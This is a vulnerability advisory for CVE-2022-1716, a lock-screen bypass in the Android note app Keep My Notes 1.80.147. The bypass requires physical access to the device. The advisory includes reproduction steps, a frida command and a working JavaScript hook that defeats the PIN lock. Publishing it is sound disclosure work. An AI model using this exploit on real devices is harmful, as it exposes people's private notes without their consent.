---
slug: advisories/tyler/
title: Keep My Notes 1.80.147 - Improper Access Control
authors: Carlos Bello
writer: cbello
codename: tyler
product: Keep My Notes 1.80.147
date: 2022-06-01 20:30 COT
cveid: CVE-2022-1716
severity: 6.1
description: Keep My Notes 1.80.147  -  Improper Access Control
keywords: Fluid Attacks, Security, Vulnerabilities, Keep My Notes, Kitetech
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | -------------------------------------------------------|
| **Name**              | Keep My Notes 1.80.147 - Improper Access Control       |
| **Code name**         | [Tyler](https://en.wikipedia.org/wiki/Steven_Tyler)    |
| **Product**           | Keep My Notes                                          |
| **Affected versions** | Version 1.80.147                                       |
| **State**             | Public                                                 |
| **Release date**      | 2022-06-01                                             |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kind**              | Improper Access Control                                                                                |
| **Rule**              | [115. Security controls bypass or absence](https://docs.fluidattacks.com/criteria/vulnerabilities/115) |
| **Remote**            | No                                                                                                     |
| **CVSSv3 Vector**     | CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N                                                           |
| **CVSSv3 Base Score** | 6.1                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2022-1716](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1716)                          |

## Description

An attacker with physical access to the victim's device can
bypass the application's password/pin lock to access user data.
This is possible due to lack of adequate security controls to
prevent dynamic code manipulation.

## Proof of Concept

It is important to know that for a successful exploitation,
the "Continue" button must be clicked repeatedly.

https://user-images.githubusercontent.com/51862990/168275718-5f8e230f-54f1-4c7c-8393-c58f0dcfda2b.mp4

### Steps to reproduce

1. Install and configure frida as indicated in the following [link](https://programmerclick.com/article/51481638343/).
2. Now just run this command to hook the `run` function so that it
   can be dynamically rewritten to bypass application protection.

   ```bash
   frida -U 'Keep My Notes' -l exploit.js
   ```

3. Now all you have to do is click the "Continue" button 3 or 4 times,
   then close the application and finally open it again.

### System Information

* Package Name: org.whiteglow.keepmynotes
* Application Label: Keep My Notes
* Mobile app version: 1.80.147
* OS: Android 8.0 (API 26)

## Exploit

```js
// exploit.js
Java.perform(() => {
    console.log("[+] Hooking LookScreenActivity - Class f - Method run");
    const LockScreenActivity = Java.use("org.whiteglow.keepmynotes.activity.LockScreenActivity");
    const f = Java.use("org.whiteglow.keepmynotes.activity.LockScreenActivity$f");
    f.run.implementation = () => {
        console.log("Bypass Lock Screen");
        LockScreenActivity.$new().d();
    }
})
```

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
Team of `Fluid Attacks`.

## References

**Vendor page** <http://www.kitetech.co/keepmynotes>

## Timeline

<time-lapse
  discovered="2022-05-12"
  contacted="2022-05-12"
  replied=""
  confirmed="2022-05-12"
  patched=""
  disclosure="2022-06-01">
</time-lapse>

